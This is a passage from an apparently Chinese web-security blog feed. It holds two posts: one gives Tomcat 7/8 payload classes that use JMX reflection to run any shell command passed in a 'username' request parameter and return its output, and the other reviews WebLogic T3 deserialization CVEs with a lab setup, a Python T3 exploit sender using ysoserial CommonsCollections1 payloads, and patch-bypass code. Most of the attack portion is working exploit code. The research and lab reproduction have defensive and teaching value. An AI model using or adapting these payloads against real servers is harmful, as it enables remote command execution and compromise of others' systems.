class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.buf.ByteChunk;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.modeler.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.management.MBeanServer;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">tomcat82</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">tomcat82</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            MBeanServer mbeanServer = Registry.getRegistry((Object)<span class="keyword">null</span>, (Object)<span class="keyword">null</span>).getMBeanServer();</span><br><span class="line">            Field field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.JmxMBeanServer"</span>).getDeclaredField(<span class="string">"mbsInterceptor"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object obj = field.get(mbeanServer);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor"</span>).getDeclaredField(<span class="string">"repository"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.Repository"</span>).getDeclaredField(<span class="string">"domainTb"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            HashMap obj2 = (HashMap)field.get(obj);</span><br><span class="line">            obj = ((HashMap)obj2.get(<span class="string">"Catalina"</span>)).get(<span class="string">"name=\"http-nio-8888\",type=GlobalRequestProcessor"</span>);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span>).getDeclaredField(<span class="string">"object"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.tomcat.util.modeler.BaseModelMBean"</span>).getDeclaredField(<span class="string">"resource"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.coyote.RequestGroupInfo"</span>).getDeclaredField(<span class="string">"processors"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            ArrayList obj3 = (ArrayList)field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.coyote.RequestInfo"</span>).getDeclaredField(<span class="string">"req"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">            String osTyp = System.getProperty(<span class="string">"os.name"</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">"win"</span>)) &#123;</span><br><span class="line">                isLinux = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; obj3.size(); i++) &#123;</span><br><span class="line">                Request obj4 = (Request) field.get(obj3.get(i));</span><br><span class="line">                String username = obj4.getParameters().getParameter(<span class="string">"username"</span>);</span><br><span class="line">                <span class="keyword">if</span>(username != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, username&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>,  username&#125;;</span><br><span class="line">                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">                    String output = <span class="string">""</span>;</span><br><span class="line">                    <span class="keyword">while</span> (s.hasNext())&#123;</span><br><span class="line">                        output += s.next();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">byte</span>[] buf = output.getBytes();</span><br><span class="line">                    ByteChunk bc = <span class="keyword">new</span> ByteChunk();</span><br><span class="line">                    bc.setBytes(buf, <span class="number">0</span>, buf.length);</span><br><span class="line">                    obj4.getResponse().doWrite(bc);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tomcat7的demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.buf.ByteChunk;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.modeler.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.MBeanServer;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">tomcat72</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">tomcat72</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            MBeanServer mbeanServer = Registry.getRegistry((Object)<span class="keyword">null</span>, (Object)<span class="keyword">null</span>).getMBeanServer();</span><br><span class="line">            Field field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.JmxMBeanServer"</span>).getDeclaredField(<span class="string">"mbsInterceptor"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object obj = field.get(mbeanServer);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor"</span>).getDeclaredField(<span class="string">"repository"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.Repository"</span>).getDeclaredField(<span class="string">"domainTb"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            HashMap obj2 = (HashMap)field.get(obj);</span><br><span class="line">            obj = ((HashMap)obj2.get(<span class="string">"Catalina"</span>)).get(<span class="string">"name=\"http-bio-8888\",type=GlobalRequestProcessor"</span>);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span>).getDeclaredField(<span class="string">"object"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.tomcat.util.modeler.BaseModelMBean"</span>).getDeclaredField(<span class="string">"resource"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.coyote.RequestGroupInfo"</span>).getDeclaredField(<span class="string">"processors"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            ArrayList obj3 = (ArrayList)field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.coyote.RequestInfo"</span>).getDeclaredField(<span class="string">"req"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">            String osTyp = System.getProperty(<span class="string">"os.name"</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">"win"</span>)) &#123;</span><br><span class="line">                isLinux = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; obj3.size(); i++) &#123;</span><br><span class="line">                Request obj4 = (Request) field.get(obj3.get(i));</span><br><span class="line">                String username = obj4.getParameters().getParameter(<span class="string">"username"</span>);</span><br><span class="line">                <span class="keyword">if</span>(username != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, username&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>,  username&#125;;</span><br><span class="line">                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">                    String output = <span class="string">""</span>;</span><br><span class="line">                    <span class="keyword">while</span> (s.hasNext())&#123;</span><br><span class="line">                        output += s.next();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">byte</span>[] buf = output.getBytes();</span><br><span class="line">                    ByteChunk bc = <span class="keyword">new</span> ByteChunk();</span><br><span class="line">                    bc.setBytes(buf, <span class="number">0</span>, buf.length);</span><br><span class="line">                    obj4.getResponse().doWrite(bc);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">//            System.out.println("=======================");</span></span><br><span class="line"><span class="comment">//            System.out.println(e);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外如果有师傅在复现的时候发现header超长，可以参考<a href="https://xz.aliyun.com/t/6227">缩小ysoserial payload体积的几个方法</a>。（也可以参考长亭师傅给的修改header头的思路，实际弄走的时候也许会遇到一些坑）</p><p>tomcat7+simple-shiro-web成功复现<br><img src="1585898629028-36d3e3fb-588d-4acd-8b68-a32c49da90a7.png#align=left&display=inline&height=541&name=image.png&originHeight=1082&originWidth=2568&size=511446&status=done&style=none&width=1284" alt="image.png"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>感谢大师傅们开源的自己的思路，学到很多。其次在研究这种方法的时候发现还有其他很多MBean，也许还有很多好玩的东西？</p>]]></content>
    
    <summary type="html">
    
      离大结局又进了一步
    
    </summary>
    
    
      <category term="web security" scheme="http://yoursite.com/categories/web-security/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>weblogic历史T3反序列化漏洞及补丁梳理</title>
    <link href="http://yoursite.com/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/"/>
    <id>http://yoursite.com/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/</id>
    <published>2020-03-25T09:57:05.000Z</published>
    <updated>2020-07-11T08:04:03.381Z</updated>
    
    <content type="html"><![CDATA[<!-- 如题 --><!-- more --><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用ateam大哥开源的调试环境<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">Weblogic环境搭建工具</a></p><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .</span><br><span class="line">docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21</span><br></pre></td></tr></table></figure><h3 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h3><p>将weblogic依赖的jar包拷贝出来并导入idea。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir wlserver1036</span><br><span class="line">docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./wlserver1036</span><br><span class="line">docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver/server/lib ./wlserver1036</span><br><span class="line">docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./coherence_3.7/lib</span><br></pre></td></tr></table></figure><p><img src="1584628921983-32316897-d553-44d1-96f7-dac78f09b6b7.png" alt="image.png"></p><p>远程调试配置<br><img src="1584628994284-2bcf4d7e-e223-411e-ad60-c66f5bea1520.png" alt="image.png"></p><h2 id="T3-协议说明"><a href="#T3-协议说明" class="headerlink" title="T3 协议说明"></a>T3 协议说明</h2><p>t3是oracle对rmi的增强，和rmi一样在网络间传输时数据是序列化过的。文章的重点在于分析漏洞以及补丁为什么可以绕过，就不分析t3协议数据的格式了，在复现时我们只需要将生成的恶意序列化数据套在py模版中即可。如果有师傅想对weblogic体系及其t3协议的正常使用感兴趣推荐阅读<a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247485058&idx=1&sn=d22b310acf703a32d938a7087c8e8704">WebLogic安全研究报告</a>。</p><h2 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h2><p>t3协议的传输过来的数据会在weblogic.rjvm.InboundMsgAbbrev#readObject中读取并进行反序列化。<br><img src="1584601233181-753caf13-53d7-4aac-8418-72313cad68bc.png" alt="image.png"><br>因为是t3第一洞所以可以看到ServerChannelInputStream的resolveClass并没有任何做防御。<img src="1584601257106-fcbcd3bf-a03a-475c-b81e-b9a076e86ab2.png" alt="image.png"><br>自带cc链<br><img src="1584628722500-b9b2433c-a6e7-47a8-ad72-91ff7179875c.png" alt="image.png"></p><p>所以只需要把ysoserial的生成的payload嵌入t3协议即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload1</span><span class="params">(gadget, command)</span>:</span></span><br><span class="line">    JAR_FILE = <span class="string">'/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload2</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(host, port, payload)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    handshake = <span class="string">"t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    pattern = re.compile(<span class="string">r"HELO:(.*).false"</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">if</span> len(version) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"Not Weblogic"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Weblogic &#123;&#125;"</span>.format(version[<span class="number">0</span>]))</span><br><span class="line">    data_len = binascii.a2b_hex(<span class="string">b"00000000"</span>) <span class="comment">#数据包长度，先占位，后面会根据实际情况重新</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006"</span>) <span class="comment">#t3协议头</span></span><br><span class="line">    flag = binascii.a2b_hex(<span class="string">b"fe010000"</span>) <span class="comment">#反序列化数据标志</span></span><br><span class="line">    payload = data_len + t3header + flag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">'&gt;I'</span>, len(payload)) + payload[<span class="number">4</span>:] <span class="comment">#重新计算数据包长度</span></span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    host = <span class="string">"127.0.0.1"</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">"CommonsCollections1"</span> <span class="comment">#CommonsCollections1 Jdk7u21</span></span><br><span class="line">    command = <span class="string">"touch /tmp/CVE-2015-4852"</span></span><br><span class="line"></span><br><span class="line">    payload = get_payload1(gadget, command)</span><br><span class="line">    exp(host, port, payload)</span><br></pre></td></tr></table></figure><h2 id="CVE-2015-4852的修复"><a href="#CVE-2015-4852的修复" class="headerlink" title="CVE-2015-4852的修复"></a>CVE-2015-4852的修复</h2><p>补丁：2016年1月 p21984589_1036_Generic<br>修复方法是在resolveClass中引入了 ClassFilter.isBlackListed进行过滤，跟进weblogic.rmi.ClassFilter可以看到黑名单内容。<br><img src="1584603275786-9f17f890-175d-49f5-95da-7eeaa1fcc48e.png" alt="image.png"></p><p><img src="1584933120054-b1f0b1cc-f9a7-4e35-a591-27af88d29ab2.png" alt="image.png"></p><p>除此之外，另外几个反序列化点也被加了相同的过滤（不一一打开看了）。<br><img src="1584629682488-1765cfe9-738d-46a7-8dcf-5341c7ac5c6f.png" alt="image.png"></p><p><strong>反序列化两个关键点，一个是触发反序列化的点，二是gadget。现在反序列化触发点有了，后面的t3的cve就是绕黑名单的各种技巧了。</strong></p><p>为了让后面的分析更具有说服力，这里以10.3.6为例说明如何打补丁。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -it  -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21 /bin/bash</span><br><span class="line">docker cp /Users/cengsiqi/Downloads/p21984589_1036_Generic weblogic1036jdk7u21:/p21984589_1036_Generic</span><br><span class="line">docker <span class="built_in">exec</span> -it weblogic1036jdk7u21 /bin/bash</span><br><span class="line"><span class="built_in">cd</span> /p21984589_1036_Generic</span><br><span class="line">mv patch-catalog_23510.xml  patch-catalog.xml</span><br><span class="line"><span class="built_in">cd</span> /u01/app/oracle/middleware/utils/bsu</span><br><span class="line">./bsu.sh -install -patch_download_dir=/p21984589_1036_Generic -patchlist=S8C2 -prod_dir=/u01/app/oracle/middleware/wlserver/</span><br><span class="line">/u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh</span><br></pre></td></tr></table></figure><p>如果打补丁时出现如下错误需要自行把bsu.sh中的内存参数MEM_ARGS调大一点。<br><img src="1584631227480-e3ca11bc-0c53-475e-9cd7-84828bef3c5f.png" alt="image.png"><br>成功后截图如下<br><img src="1584631564760-944c5d18-1fa7-432a-b0bb-48b1a83e1379.png" alt="image.png"><br>这时再尝试打会出现Unauthorized<br><img src="1584632143015-10d8cd9f-88ab-41dc-807d-14af2ab6ef9b.png" alt="image.png"></p><h2 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h2><p>weblogic.jms.common.StreamMessageImpl没在黑名单，在其反序列化时会读取一段数据并进行反序列化，我们可以把这段数据伪造成rce payload。<br><img src="1584605337636-f9686a30-b0ee-4463-ac50-c0aa1727c272.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2016_0638</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payload = exec(<span class="string">"CommonsCollections1"</span>, <span class="string">"touch /tmp/CVE_2016_0638"</span>);</span><br><span class="line">        StreamMessageImpl streamMessage = <span 